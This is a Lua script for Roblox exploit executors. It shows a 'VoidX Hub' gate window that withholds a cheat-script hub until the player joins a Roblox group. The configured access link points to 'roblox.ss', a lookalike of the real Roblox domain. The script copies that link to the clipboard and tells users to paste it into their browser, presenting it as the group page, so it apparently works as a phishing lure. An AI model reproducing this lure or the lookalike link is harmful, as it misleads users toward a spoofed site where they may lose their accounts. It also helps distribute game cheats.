
--[[ Group Gate v5. Only edit CONFIG. ]]

local CONFIG = {
	Name     = "VoidX Hub",
	Subtitle = "Premium Build",
	GroupId  = 1234567,   -- <<< your Roblox group ID
	MinRank  = 1,         -- 1 = any member. Raise it to require a higher role
	Link     = "https://www.roblox.ss/communities/7763728843/Rblx-Scripts",        -- <<< "" = auto-use the group page, or paste any link (change anytime)
	Pink     = Color3.fromRGB(255, 46, 151),
	Cyan     = Color3.fromRGB(0, 240, 255),
}

local function OnSuccess()
	print("Access granted")
	-- put the code that should run for group members here
end

----------------------------------------------------------------
print("[GroupGate] started")
local okRun, errRun = pcall(function()
local Players, TS, UIS, RS = game:GetService("Players"), game:GetService("TweenService"), game:GetService("UserInputService"), game:GetService("RunService")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local parent = PlayerGui
if gethui then local ok, h = pcall(gethui) if ok and h then parent = h end
else local ok = pcall(function() return game:GetService("CoreGui").Name end) if ok then parent = game:GetService("CoreGui") end end
for _, p in ipairs({parent, PlayerGui}) do
	pcall(function() if p:FindFirstChild("GroupGateV5") then p.GroupGateV5:Destroy() end end)
end

local P, C, GREEN = CONFIG.Pink, CONFIG.Cyan, Color3.fromRGB(80, 255, 150)
local WHITE, MUTED = Color3.fromRGB(235, 238, 255), Color3.fromRGB(135, 142, 175)
local W, H = 560, 350
local LEFT = Enum.TextXAlignment.Left
local link = (CONFIG.Link ~= "") and CONFIG.Link or ("https://www.roblox.com/communities/" .. CONFIG.GroupId)

local function tw(o, t, p, s) local x = TS:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quint), p) x:Play() return x end
local function new(cls, props, par) local o = Instance.new(cls) for k, v in pairs(props) do o[k] = v end o.Parent = par return o end
local function round(o, r) return new("UICorner", {CornerRadius = UDim.new(0, r)}, o) end
local function line(o, col, th, tr) return new("UIStroke", {Color = col, Thickness = th, Transparency = tr or 0, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, o) end
local function text(par, p) p.BackgroundTransparency = 1 p.Font = p.Font or Enum.Font.GothamMedium p.TextColor3 = p.TextColor3 or WHITE return new("TextLabel", p, par) end

local gui = new("ScreenGui", {Name = "GroupGateV5", ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 999, ZIndexBehavior = Enum.ZIndexBehavior.Sibling}, nil)
if syn and syn.protect_gui then pcall(syn.protect_gui, gui) end
if not pcall(function() gui.Parent = parent end) or gui.Parent ~= parent then gui.Parent = PlayerGui end

local main = new("Frame", {Size = UDim2.fromOffset(0, 0), Position = UDim2.fromScale(0.5, 0.5), AnchorPoint = Vector2.new(0.5, 0.5),
	BackgroundColor3 = Color3.fromRGB(12, 11, 22), BackgroundTransparency = 0.08, ClipsDescendants = true}, gui)
round(main, 14)
local border = line(main, WHITE, 1.5, 0.15)
local borderG = new("UIGradient", {Color = ColorSequence.new({ColorSequenceKeypoint.new(0, P), ColorSequenceKeypoint.new(0.5, C), ColorSequenceKeypoint.new(1, P)})}, border)

-- top bar
local bar = new("Frame", {Size = UDim2.new(1, 0, 0, 44), BackgroundTransparency = 1}, main)
text(bar, {Size = UDim2.fromOffset(400, 44), Position = UDim2.fromOffset(20, 0), Text = CONFIG.Name, TextSize = 15, Font = Enum.Font.GothamBold, TextXAlignment = LEFT})
local sub = text(bar, {Size = UDim2.fromOffset(200, 44), Position = UDim2.fromOffset(20 + #CONFIG.Name * 8.5 + 8, 0), Text = CONFIG.Subtitle, TextSize = 13, TextColor3 = MUTED, TextXAlignment = LEFT})
new("Frame", {Size = UDim2.new(1, 0, 0, 1), Position = UDim2.new(0, 0, 1, 0), BackgroundColor3 = WHITE, BackgroundTransparency = 0.92, BorderSizePixel = 0}, bar)
local function barBtn(label, x, hover)
	local b = new("TextButton", {Size = UDim2.fromOffset(26, 26), Position = UDim2.fromOffset(x, 9), BackgroundColor3 = WHITE, BackgroundTransparency = 1, Text = label, TextSize = 15,
		Font = Enum.Font.GothamBold, TextColor3 = MUTED, AutoButtonColor = false}, bar)
	round(b, 8)
	b.MouseEnter:Connect(function() tw(b, 0.15, {BackgroundColor3 = hover, BackgroundTransparency = 0.1, TextColor3 = WHITE}) end)
	b.MouseLeave:Connect(function() tw(b, 0.15, {BackgroundTransparency = 1, TextColor3 = MUTED}) end)
	return b
end
local minBtn, closeBtn = barBtn("-", W - 68, C), barBtn("X", W - 36, P)

-- sidebar + tabs
local side = new("Frame", {Size = UDim2.new(0, 170, 1, -45), Position = UDim2.fromOffset(0, 45), BackgroundTransparency = 1}, main)
local pages, tabs = {}, {}
local function selectTab(name)
	for n, pg in pairs(pages) do pg.Visible = (n == name) end
	for n, t in pairs(tabs) do
		tw(t.ind, 0.2, {BackgroundTransparency = (n == name) and 0 or 1})
		tw(t.bg, 0.2, {BackgroundTransparency = (n == name) and 0.9 or 1})
	end
end
local function makeTab(name, label, y)
	local bg = new("TextButton", {Size = UDim2.fromOffset(150, 40), Position = UDim2.fromOffset(10, y), BackgroundColor3 = WHITE, BackgroundTransparency = 1, Text = "", AutoButtonColor = false}, side)
	round(bg, 8)
	local ind = new("Frame", {Size = UDim2.fromOffset(3, 22), Position = UDim2.fromOffset(0, 9), BackgroundColor3 = C, BackgroundTransparency = 1, BorderSizePixel = 0}, bg)
	round(ind, 2)
	text(bg, {Size = UDim2.new(1, -20, 1, 0), Position = UDim2.fromOffset(16, 0), Text = label, TextSize = 14, TextXAlignment = LEFT})
	bg.MouseButton1Click:Connect(function() selectTab(name) end)
	tabs[name] = {bg = bg, ind = ind}
end
makeTab("auth", "Authentication", 14)
makeTab("help", "Instructions", 60)

local function newPage(name, title)
	local pg = new("Frame", {Size = UDim2.fromOffset(350, H - 56), Position = UDim2.fromOffset(190, 56), BackgroundTransparency = 1, Visible = false}, main)
	text(pg, {Size = UDim2.fromOffset(330, 36), Text = title, TextSize = 26, Font = Enum.Font.GothamBlack, TextXAlignment = LEFT})
	pages[name] = pg
	return pg
end
local function card(par, y, h, title, desc, col)
	local f = new("Frame", {Size = UDim2.fromOffset(330, h), Position = UDim2.fromOffset(0, y), BackgroundColor3 = WHITE, BackgroundTransparency = 0.94, BorderSizePixel = 0}, par)
	round(f, 10)
	line(f, WHITE, 1, 0.9)
	local t = text(f, {Size = UDim2.new(1, -50, 0, 20), Position = UDim2.fromOffset(14, 10), Text = title, TextSize = 15, Font = Enum.Font.GothamBold, TextXAlignment = LEFT, TextColor3 = col or WHITE})
	local d = text(f, {Size = UDim2.new(1, -50, 0, h - 34), Position = UDim2.fromOffset(14, 32), Text = desc, TextSize = 12, TextColor3 = MUTED, TextWrapped = true, TextXAlignment = LEFT, TextYAlignment = Enum.TextYAlignment.Top})
	return f, t, d
end
local function clickable(f, cb)
	text(f, {Size = UDim2.fromOffset(30, 20), Position = UDim2.new(1, -34, 0.5, -10), Text = ">", TextSize = 18, Font = Enum.Font.GothamBold, TextColor3 = WHITE})
	local b = new("TextButton", {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Text = "", ZIndex = 5}, f)
	b.MouseEnter:Connect(function() tw(f, 0.15, {BackgroundTransparency = 0.88}) end)
	b.MouseLeave:Connect(function() tw(f, 0.15, {BackgroundTransparency = 0.94}) end)
	b.MouseButton1Click:Connect(cb)
end

-- Authentication page
local auth = newPage("auth", "Authentication")
local _, lockT, lockD = card(auth, 46, 80, "Checking...", "Verifying your group membership.", C)
local copyCard = card(auth, 134, 62, "Copy Access Link", "Copies the group URL to your clipboard")
local checkCard = card(auth, 204, 62, "Check Again", "Joined the group? Press here to verify")

-- Instructions page
local help = newPage("help", "Instructions")
card(help, 46, 62, "1. Copy the link", "Press Copy Access Link on the Authentication tab.")
card(help, 116, 62, "2. Open your browser", "Paste the link into your browser's address bar.")
card(help, 186, 76, "3. Join and verify", "Join the group, rejoin the game if needed, then press Check Again.")

-- toast
local toastF = new("Frame", {Size = UDim2.fromOffset(280, 62), Position = UDim2.fromOffset(W - 300, H + 10), BackgroundColor3 = Color3.fromRGB(20, 17, 34), ZIndex = 8}, main)
round(toastF, 10)
local toastLine = line(toastF, P, 1.2, 0.2)
local toastT = text(toastF, {Size = UDim2.fromOffset(240, 20), Position = UDim2.fromOffset(14, 9), TextSize = 14, Font = Enum.Font.GothamBold, TextXAlignment = LEFT, ZIndex = 9})
local toastB = text(toastF, {Size = UDim2.fromOffset(250, 26), Position = UDim2.fromOffset(14, 30), TextSize = 12, TextColor3 = MUTED, TextWrapped = true, TextXAlignment = LEFT, TextYAlignment = Enum.TextYAlignment.Top, ZIndex = 9})
local toastId = 0
local function toast(title, body, col)
	toastId = toastId + 1 local id = toastId
	toastT.Text, toastB.Text, toastT.TextColor3, toastLine.Color = title, body, col, col
	tw(toastF, 0.4, {Position = UDim2.fromOffset(W - 300, H - 78)}, Enum.EasingStyle.Back)
	task.delay(3, function() if id == toastId then tw(toastF, 0.3, {Position = UDim2.fromOffset(W - 300, H + 10)}) end end)
end

-- minimize pill + toggle key
local pill = new("TextButton", {Size = UDim2.fromOffset(150, 34), Position = UDim2.new(0.5, -75, 0, 14), BackgroundColor3 = Color3.fromRGB(14, 12, 28), Text = CONFIG.Name,
	TextSize = 13, Font = Enum.Font.GothamBold, TextColor3 = C, AutoButtonColor = false, Visible = false}, gui)
round(pill, 17)
line(pill, P, 1.5, 0.2)
local function setHidden(h) main.Visible = not h pill.Visible = h end
minBtn.MouseButton1Click:Connect(function() setHidden(true) end)
pill.MouseButton1Click:Connect(function() setHidden(false) end)
local keyConn = UIS.InputBegan:Connect(function(i, gp)
	if not gp and i.KeyCode == Enum.KeyCode.RightShift then setHidden(main.Visible) end
end)

local conn
local function closeGui()
	tw(main, 0.35, {Size = UDim2.fromOffset(0, 0)}, Enum.EasingStyle.Back).Completed:Wait()
	conn:Disconnect() keyConn:Disconnect() gui:Destroy()
end
closeBtn.MouseButton1Click:Connect(closeGui)

-- group check
local function isMember()
	local ok, rank = pcall(function() return Players.LocalPlayer:GetRankInGroup(CONFIG.GroupId) end)
	return ok and rank >= CONFIG.MinRank
end
local checking = false
local function verify()
	if checking then return end checking = true
	lockT.Text, lockT.TextColor3, lockD.Text = "Checking...", C, "Verifying your group membership."
	task.wait(0.7)
	if isMember() then
		lockT.Text, lockT.TextColor3, lockD.Text = "Access Granted", GREEN, "Welcome! Loading the script..."
		toast("Authentication", "You're in the group. Welcome!", GREEN)
		task.wait(1.3) closeGui() OnSuccess()
		return
	end
	lockT.Text, lockT.TextColor3 = "Access Locked", P
	lockD.Text = "This script hub requires you to join our group to access the rest of the script."
	toast(CONFIG.Name .. " Authentication", "Oops looks like you're not in the group", P)
	checking = false
end
clickable(copyCard, function()
	local ok = pcall(function() setclipboard(link) end)
	toast("Authentication", ok and "Group link copied to your clipboard" or ("Copy failed. Link: " .. link), ok and C or Color3.fromRGB(255, 190, 80))
end)
clickable(checkCard, verify)

-- animation + drag
local t0 = os.clock()
conn = RS.Heartbeat:Connect(function() borderG.Rotation = ((os.clock() - t0) * 70) % 360 end)
do
	local drag, sp, si
	bar.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then drag, sp, si = true, main.Position, i.Position end
	end)
	UIS.InputChanged:Connect(function(i)
		if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
			local d = i.Position - si
			main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
		end
	end)
	UIS.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then drag = false end
	end)
end

selectTab("auth")
print("[GroupGate] GUI created in: " .. gui:GetFullName())
tw(main, 0.5, {Size = UDim2.fromOffset(W, H)}, Enum.EasingStyle.Back).Completed:Wait()
verify()

end)
print("[GroupGate] finished, ok = " .. tostring(okRun))
if not okRun then warn("[GroupGate] error: " .. tostring(errRun)) end
